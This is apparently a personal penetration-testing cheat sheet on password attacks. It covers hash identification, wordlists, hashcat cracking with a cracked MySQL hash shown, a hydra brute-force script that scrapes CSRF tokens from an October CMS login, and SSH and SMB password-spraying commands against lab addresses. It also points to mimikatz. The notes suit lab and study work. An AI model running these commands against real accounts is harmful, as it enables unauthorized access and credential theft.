# Password Attacks Main
[TOC]
###### tags: `security` `PasswordAttack`

# Hash Identify
## hash-identifier
* [GitHub](https://github.com/blackploit/hash-identifier)
# Wordlist
* /usr/share/wordlist
* /usr/share/wfuzz/wordlist
* /usr/share/golismero/wordlist
* /usr/share/dirb/wordlist

## crunch
產字典檔

# Cracker
## hashcat

### CheatSheet
```
-a [Attack Modes]
hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
```
### Find Hash Type
```
hashcat --example-hashes | grep -A 2 -B 1 MySQL
MODE: 200
TYPE: MySQL323
HASH: 7196759210defdc0
PASS: hashcat
--
MODE: 300
TYPE: MySQL4.1/MySQL5
HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130
PASS: hashcat
```
### Crack
```
.\hashcat64.exe -m 300 Z:\temporary_share\mysql.DBadmin ..\rockyou.txt
2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
```


## hydra
Very fast network logon cracker `FTP、HTTP、HTTPS、MySQL、MS SQL、Oracle、Cisco、IMAP、VNC`

```
<form method="POST" action="http://192.168.23.43/october/backend/backend/auth/signin" accept-charset="UTF-8"><input name="_session_key" type="hidden" value="ycAQqg2iO9JcC5htu7hAQfjuU5O40woSuzFToJru"><input name="_token" type="hidden" value="DVnX6bPdshG2fTBv15ziHFCinYUGwzoXXLWYa2cS">    <input type="hidden" name="postback" value="1" />
```
```
_session_key=QK2TDe7JBjSXtMe7BsB5LIvu1olwJ9DligCAGb9b&_token=tapg9kGUfJGIRgmeO8i8THMgVlFouvl5Ipsah0Oc&postback=1&login=fyodor&password=AAAA
```
```
SESSIONKEY=$(curl -s "http://192.168.23.43/october/backend/backend/auth/signin" | grep "POST" | tee post_form | awk -F 'value=' '{print $2}' | awk -F '"' '{print $2}')
CSRF=$(cat post_form | awk -F 'value=' '{print $3}' | awk -F '"' '{print $2}')
hydra -l fyodor -P /usr/share/wordlists/rockyou.txt 192.168.23.43 http-post-form "/october/backend/backend/auth/signin:_session_key=${SESSIONKEY}&_token=${CSRF}&postback=1&login=^USER^&password=^PASS^:F=did not match"
```

python3 script: https://www.youtube.com/watch?v=d2nVDoVr0jE

* `hydra -L users.txt -P passwords.txt ssh://10.10.10.184`

## John the Ripper

## CrackMapExec
* `crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt`

# Others
## [mimikatz](https://github.com/gentilkiwi/mimikatz)
Windows - Password stealing